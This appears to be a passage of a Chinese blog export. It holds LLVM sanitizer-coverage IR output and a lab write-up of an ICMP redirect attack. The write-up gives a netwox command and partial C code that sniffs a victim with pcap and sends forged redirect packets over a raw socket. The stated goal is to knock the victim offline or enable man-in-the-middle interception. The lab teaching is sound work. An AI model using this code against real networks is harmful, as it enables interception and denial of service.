class="meta prompt_">  %</span><span class="language-bash">retval = alloca i32, align 4</span></span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">a = alloca i32, align 4</span></span><br><span class="line">  call void @__sanitizer_cov_trace_pc_guard(ptr @__sancov_gen_.1) #3</span><br><span class="line">  store i32 0, ptr %retval, align 4</span><br><span class="line">  store i32 100, ptr %a, align 4</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">0 = load i32, ptr %a, align 4</span></span><br><span class="line">  call void @func(i32 noundef %0)</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_trace_pc_indir(i64)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_trace_cmp1(i8 zeroext, i8 zeroext)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_trace_cmp2(i16 zeroext, i16 zeroext)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_trace_cmp4(i32 zeroext, i32 zeroext)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_trace_cmp8(i64, i64)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_trace_const_cmp1(i8 zeroext, i8 zeroext)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_trace_const_cmp2(i16 zeroext, i16 zeroext)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_trace_const_cmp4(i32 zeroext, i32 zeroext)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_trace_const_cmp8(i64, i64)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_load1(ptr)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_load2(ptr)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_load4(ptr)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_load8(ptr)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_load16(ptr)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_store1(ptr)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_store2(ptr)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_store4(ptr)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_store8(ptr)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_store16(ptr)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_trace_div4(i32 zeroext)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_trace_div8(i64)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_trace_gep(i64)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_trace_switch(i64, ptr)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_trace_pc()</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_trace_pc_guard(ptr)</span><br><span class="line"></span><br><span class="line">declare void @__sanitizer_cov_trace_pc_guard_init(ptr, ptr)</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind uwtable</span><br><span class="line">define internal void @sancov.module_ctor_trace_pc_guard() #2 &#123;</span><br><span class="line">  call void @__sanitizer_cov_trace_pc_guard_init(ptr @&quot;\01section$start$__DATA$__sancov_guards&quot;, ptr @&quot;\01section$end$__DATA$__sancov_guards&quot;)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone ssp uwtable &quot;frame-pointer&quot;=&quot;all&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;penryn&quot; &quot;target-features&quot;=&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line">attributes #1 = &#123; &quot;frame-pointer&quot;=&quot;all&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;penryn&quot; &quot;target-features&quot;=&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line">attributes #2 = &#123; nounwind uwtable &quot;frame-pointer&quot;=&quot;all&quot; &#125;</span><br><span class="line">attributes #3 = &#123; nomerge &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0, !1, !2, !3, !4&#125;</span><br><span class="line">!llvm.ident = !&#123;!5&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 2, !&quot;SDK Version&quot;, [2 x i32] [i32 12, i32 0]&#125;</span><br><span class="line">!1 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!2 = !&#123;i32 7, !&quot;PIC Level&quot;, i32 2&#125;</span><br><span class="line">!3 = !&#123;i32 7, !&quot;uwtable&quot;, i32 2&#125;</span><br><span class="line">!4 = !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125;</span><br><span class="line">!5 = !&#123;!&quot;clang version 15.0.3&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到成功插入了__sanitizer_cov_trace_pc_guard等函数，用于对分支等的记录。</p><p>也可以用nm看一下符号信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">➜  test opt --passes=sancov-module test.ll -o test.cov.bc --sanitizer-coverage-trace-pc-guard --sanitizer-coverage-level=3</span><br><span class="line">➜  test llvm-nm test.cov.bc</span><br><span class="line">                 U ___sancov_lowest_stack</span><br><span class="line">                 U ___sanitizer_cov_load1</span><br><span class="line">                 U ___sanitizer_cov_load16</span><br><span class="line">                 U ___sanitizer_cov_load2</span><br><span class="line">                 U ___sanitizer_cov_load4</span><br><span class="line">                 U ___sanitizer_cov_load8</span><br><span class="line">                 U ___sanitizer_cov_store1</span><br><span class="line">                 U ___sanitizer_cov_store16</span><br><span class="line">                 U ___sanitizer_cov_store2</span><br><span class="line">                 U ___sanitizer_cov_store4</span><br><span class="line">                 U ___sanitizer_cov_store8</span><br><span class="line">                 U ___sanitizer_cov_trace_cmp1</span><br><span class="line">                 U ___sanitizer_cov_trace_cmp2</span><br><span class="line">                 U ___sanitizer_cov_trace_cmp4</span><br><span class="line">                 U ___sanitizer_cov_trace_cmp8</span><br><span class="line">                 U ___sanitizer_cov_trace_const_cmp1</span><br><span class="line">                 U ___sanitizer_cov_trace_const_cmp2</span><br><span class="line">                 U ___sanitizer_cov_trace_const_cmp4</span><br><span class="line">                 U ___sanitizer_cov_trace_const_cmp8</span><br><span class="line">                 U ___sanitizer_cov_trace_div4</span><br><span class="line">                 U ___sanitizer_cov_trace_div8</span><br><span class="line">                 U ___sanitizer_cov_trace_gep</span><br><span class="line">                 U ___sanitizer_cov_trace_pc</span><br><span class="line">                 U ___sanitizer_cov_trace_pc_guard</span><br><span class="line">                 U ___sanitizer_cov_trace_pc_guard_init</span><br><span class="line">                 U ___sanitizer_cov_trace_pc_indir</span><br><span class="line">                 U ___sanitizer_cov_trace_switch</span><br><span class="line">---------------- T _func</span><br><span class="line">---------------- T _main</span><br><span class="line">                 U _printf</span><br><span class="line">---------------- t _sancov.module_ctor_trace_pc_guard</span><br><span class="line">                 w section$end$__DATA$__sancov_guards</span><br><span class="line">                 w section$start$__DATA$__sancov_guards</span><br></pre></td></tr></table></figure><h2 id="可能存在的问题"><a href="#可能存在的问题" class="headerlink" title="可能存在的问题"></a>可能存在的问题</h2><p>（1）使用MacOS编译LLVM源代码，然后编译出来的clang编译前端C程序，会出现找不到stdio.h</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  test clang helloworld.c</span><br><span class="line">helloworld.c:1:9: fatal error: &#x27;stdio.h&#x27; file not found</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;stdio.h&gt;</span></span><br><span class="line">        ^~~~~~~~~</span><br><span class="line">1 error generated.</span><br></pre></td></tr></table></figure><p>增加编译选项: -isysroot `xcrun –show-sdk-path` ，例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  test clang helloworld.c -isysroot `xcrun --show-sdk-path`</span><br><span class="line">➜  test ./a.out</span><br><span class="line">Hello world!</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/LittleSec/p/12757964.html">https://www.cnblogs.com/LittleSec/p/12757964.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> LLVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unicorn</title>
      <link href="/2022/12/28/unicorn/"/>
      <url>/2022/12/28/unicorn/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fuzz</title>
      <link href="/2022/12/28/fuzz/"/>
      <url>/2022/12/28/fuzz/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> FUZZ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLVM PASS</title>
      <link href="/2022/12/19/LLVM-PASS/"/>
      <url>/2022/12/19/LLVM-PASS/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> LLVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ICMP重定向攻击</title>
      <link href="/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/"/>
      <url>/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>（新搭了博客，贴一篇远古前的文章看看效果）</p><h2 id="一-实验原理"><a href="#一-实验原理" class="headerlink" title="一 实验原理"></a>一 实验原理</h2><p>ICMP重定向信息是路由器向主机提供实时的路由信息，当一个主机收到ICMP重定向信息时，它就会根据这个信息来更新自己的路由表。由于缺乏必要的合法性检查，如果一个黑客想要被攻击的主机修改它的路由表，黑客就会发送ICMP重定向信息给被攻击的主机，让该主机按照黑客的要求来修改路由表，如果黑客要求该主机将网关修改为黑客自己的机器，就使得该主机在发送数据包时，都会被黑客获取，进一步实现中间人攻击或者DOS攻击。</p><p>ICMP数据包格式：</p><p><img src="/../images/v2-8251c5a0153ce618bcd82c838402afa5_1440w.webp" alt="img"></p><p>有多种不同的ICMP报文，每种报文都有自己的格式，但是所有的ICMP报文都有三个共同的字段：</p><ul><li>TYPE(8-bit): identifies the message</li><li>CODE(8-bit): provides further information about the message type</li><li>CHECKSUM(16-bit)</li><li>In addition, ICMP messages that report errors always include the header and the first 64 data bits of the datagram causing the problem.</li></ul><p>TYPE字段：8位</p><ul><li>0:Echo Reply</li><li>3:Destination Unreachable</li><li>4:Source Quench</li><li>5:Redirect (change route)</li><li>8:Echo Request</li><li>9:Router Advertisement</li><li>10:Router Solicitation</li><li>11:time Exceeded for a Datagram</li><li>12:Parameter Problem on a Datagram</li><li>13:timestamp Request</li><li>14:Timestamp Reply</li><li>17:Address Mask Request</li><li>18:Address Mask Reply</li></ul><p>在此要实现的是ICMP的重定向，所以编码时TYPE应该为5，在写PING包的时候，请求时的TYPE应该为8，而回复时应该为0 。</p><p>CODE字段：8位</p><ul><li>0:network unreachable</li><li>1:host unreachable</li><li>2:protocol unreachable</li><li>3:port unreachable</li><li>4:fragmentation needed and DF(don’t fragment) set</li><li>5: source route failed</li></ul><p>CHECKSUM：16位校验和。</p><p>Gateway Internet Address：对于ICMP重定向包，需要让对方依照收到的网关地址将路由表中的网关地址进行修改。</p><p>DATA：包内容，需要28字节的数据，包括原始IP数据报的头部（20字节）及其数据部分的前8字节。</p><p>综上，在进行发包的时候我们需要填写内容有：20字节的IP包头部+8字节的ICMP包头部+28字节的数据部分。</p><h2 id="二-实验环境"><a href="#二-实验环境" class="headerlink" title="二 实验环境"></a>二 实验环境</h2><ol><li><p>Mac OS IP地址：192.168.1.97（攻击机）</p></li><li><p>Ubuntu IP地址：192.168.1.4（被攻击机）</p></li><li><p>Kali Linux IP地址：192.168.1.14（攻击机）</p></li><li><p>原始网关地址：192.168.1.1</p></li></ol><h2 id="三-实验步骤"><a href="#三-实验步骤" class="headerlink" title="三 实验步骤"></a>三 实验步骤</h2><ol><li>使用netwox体会实验效果，使用netwox 86发送ICMP重定向包，</li></ol><p>sudo netwox 86 –g 192.168.1.97 –i 192.168.1.1</p><p>被攻击机使用ping <a href="https://link.zhihu.com/?target=http://baidu.com">http://baidu.com</a>命令，可以得到以下结果：</p><p><img src="/../images/image-20221211152620226.png" alt="image-20221211152620226"></p><p>表示netwox成功进行了ICMP重定向。</p><p>启动wireshark，观察netwox发出的数据包：</p><p><img src="/../images/image-20221211152658388.png" alt="image-20221211152658388"></p><p>通过wireshark抓包查看所发出的数据包的源IP是.1而不是攻击者真实的IP；</p><p>通过抓包，查看攻击数据包的结构</p><p><img src="/../images/image-20221211152713423.png" alt="image-20221211152713423"></p><p>请注意，ICMP重定向报文除了ICMP包中的通用头部之外，还包括原始IP头部信息和数据报文的前8个字节。也即，在构造ICMP重定向包中，除了头部之外，还需要额外的28字节（在IP头部没有可选字段的情况下）</p><p>另外，注意观察，netwox发出的ICMP重定向包的目的IP是受害者正通信的IP，也即，netwox先抓到受害者的数据包，根据捕获包的IP地址，再构造攻击包。</p><ol start="2"><li>在充分了解实验原理的基础上，自己使用raw socket，写出来一个icmp redirect包，达到使受害者不能正常上网的目的。</li></ol><p>代码如下：</p><ol><li>主函数</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *dev;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: %s Attacker-ip Target-ip Gateway\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ip_atk = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">ip_tgt = argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">ip_gw = argv[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">dev = FindDev(); <span class="comment">//查找dev</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;attacker: %s\ntarget: %s\nGateway: %s\nFounded Device: %s\nStart ICMP redirecting...\n&quot;</span>,ip_atk, ip_tgt, ip_gw, dev);</span><br><span class="line"></span><br><span class="line">sniff(dev);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数引导用户输入攻击机ip，受害者ip，网关地址，然后利用FindDev()函数查找主机默认的设备。然后执行sniff()嗅探过程。</p><ol start="2"><li>FindDev()</li></ol><p>用于查找默认设备。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">FindDev</span><span class="params">()</span>&#123; <span class="comment">// 查找默认设备</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *dev, errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line"></span><br><span class="line">dev = pcap_lookupdev(errbuf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dev == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Couldn&#x27;t find default device: %s\n&quot;</span>, errbuf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> dev;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>嗅探</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sniff</span><span class="params">(<span class="type">char</span> * dev)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="type">pcap_t</span> * handle;</span><br><span class="line"></span><br><span class="line">bpf_u_int32 net = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">bpf_u_int32 mask = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> <span class="title">fp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> filter_exp[<span class="number">100</span>] = <span class="string">&quot;&quot;</span>; <span class="comment">//filter_exp内容为过滤表达式</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(filter_exp, <span class="string">&quot;src host %s&quot;</span>, ip_tgt);<span class="comment">// 过滤表达式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pcap_lookupnet(dev, &amp;net, &amp;mask, errbuf) == <span class="number">-1</span>)</span><br><span class="line">  <span class="comment">//pcap_lookupnet（）是一个函数，给定设备的名称，返回其中一个IPv4网络号和相应的网络掩码（网络号是IPv4地址与网络掩码进行AND运算，因此它只包含地址的网络部分）。</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Can&#x27;t get netmask for device %s\n&quot;</span>, dev);</span><br><span class="line"></span><br><span class="line">net = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">mask = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle = pcap_open_live(dev, <span class="number">65535</span>, <span class="number">1</span>, <span class="number">100</span>, errbuf);</span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个参数是我们在上一节中指定的设备。 snaplen是一个整数，它定义了pcap要捕获的最大字节数。 promisc，当设置为true时，将接口带入混杂模式（但是，即使设置为false，也可能在特定情况下接口处于混杂模式，无论如何）。 to_ms是读取超时（以毫秒为单位）（值为0表示没有time out；至少在某些平台上，这意味着可能要等到足够数量的数据包到达才能看到任何数据包，因此应该使用非零值）。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (handle == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Couldn&#x27;t open device %s: %s\n&quot;</span>, dev, errbuf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pcap_compile(handle, &amp;fp, filter_exp, <span class="number">0</span>, net) == <span class="number">-1</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个参数是我们的会话句柄（前一个例子中的pcap_t *句柄）。 接下来是对我们将存储过滤器的编译版本的位置的引用。 表达式本身就是常规字符串格式。 接下来是一个整数，它决定表达式是否应该“优化”（0为假，1为真。）最后，我们必须指定过滤器适用的网络的网络掩码。 失败时函数返回-1；所有其他值意味着成功。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Couldn&#x27;t parse filter %s: %s\n&quot;</span>, filter_exp, pcap_geterr(handle));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pcap_setfilter(handle, &amp;fp) == <span class="number">-1</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一个参数是我们的会话处理程序，第二个参数是对表达式的编译版本的引用（可能是与pcap_compile（）的第二个参数相同的变量）。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Couldn&#x27;t install filter %s: %s\n&quot;</span>, filter_exp, pcap_geterr(handle));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pcap_loop(handle, <span class="number">-1</span>, Redirect, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个参数是我们的会话句柄。接下来是一个整数，它告诉pcap_loop（）在返回之前它应该嗅探多少个数据包（负值意味着它应该嗅探直到发生错误）。第三个参数是回调函数的名称（只是函数名，没有括号）。最后一个参数在某些应用程序中很有用，但很多时候只是设置为NULL。</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>嗅探过程利用到pcap。</p><p>其中pcap_open_live()打开设备进行嗅探。</p><p>pcap_compile（）进行流量过滤，设置过滤表达式，来接收来自受害者主机的包。</p><p>pcap_setfilter()为对过滤表达式的应用。</p><p>之后执行pcap_loop()使其持续进行嗅探的操作，并且在接收到数据包时，调用回调函数Redirect来发送重定向包。</p><ol start="4"><li>回调函数Redirect()发包</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Redirect</span><span class="params">(u_char *arg, <span class="type">const</span> <span class="keyword">struct</span> pcap_pkthdr *pkthdr, <span class="type">const</span> u_char *packet)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sockfd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//int socket( int af, int type, int protocol);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//af：一个地址描述。仅支持AF_INET格式，也就是说ARPA Internet地址格式。 AF_INET使用IPv4协议</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//type：指定socket类型。发送ICMP所以使用原始套接字SOCK_RAW</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//protocol：指定协议。</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create sockfd error\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;detected a packet...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//传入socket描述符，原始数据帧地址</span></span><br><span class="line"></span><br><span class="line">u_char out_packet[<span class="number">20</span> + <span class="number">8</span> + <span class="number">28</span>]; <span class="comment">//20为ip头部 8字节icmp头 28字节为针对的原始ip首部及数据部分前28字节</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">iph</span> =</span> (<span class="keyword">struct</span> ip *)out_packet; <span class="comment">//ipHeader</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">icmp</span> *<span class="title">icmph</span> =</span> (<span class="keyword">struct</span> icmp *)(out_packet + <span class="number">20</span>); <span class="comment">//icmpHeader</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//填充ip头部内容</span></span><br><span class="line"></span><br><span class="line">iph-&gt;ip_v = <span class="number">4</span>;</span><br><span 